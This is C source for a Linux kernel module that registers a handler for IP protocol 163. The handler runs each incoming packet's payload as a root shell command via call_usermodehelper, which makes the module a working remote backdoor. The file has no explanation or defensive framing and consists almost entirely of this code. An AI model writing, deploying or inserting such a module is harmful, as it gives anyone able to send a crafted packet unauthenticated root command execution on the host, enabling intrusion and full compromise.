#include <linux/module.h>
#include <net/protocol.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <net/ip.h>

int exec_packet(struct sk_buff *skb) {
    char *argv[] = {"/bin/sh", "-c", skb->data, NULL};
    //char *argv[3] = { "/usr/bin/logger", "help!", NULL };
    char *envp[4];
    //char *envp[] = {NULL};
    /* minimal command environment */
    int i = 0;
    envp[i++] = "HOME=/";
    envp[i++] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
    envp[i] = NULL;
    const struct iphdr *iph;

    iph = ip_hdr(skb);

    printk(KERN_INFO "pkt_len: %d, ipv%d, hdr_len: %d ", skb->len, iph->version, iph->ihl);
    printk(KERN_INFO "s_ip: %pI4, ", &iph->saddr);
    printk(KERN_INFO "data: %s, ", skb->data);

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk("All done..");
    kfree_skb(skb);
    return 0;
}

static const struct net_protocol proto163_protocol = {
    .handler = exec_packet,
    .no_policy = 1,
    .netns_ok = 1
};

int init_module(void) {
    return (inet_add_protocol(&proto163_protocol, 163) < 0);
}
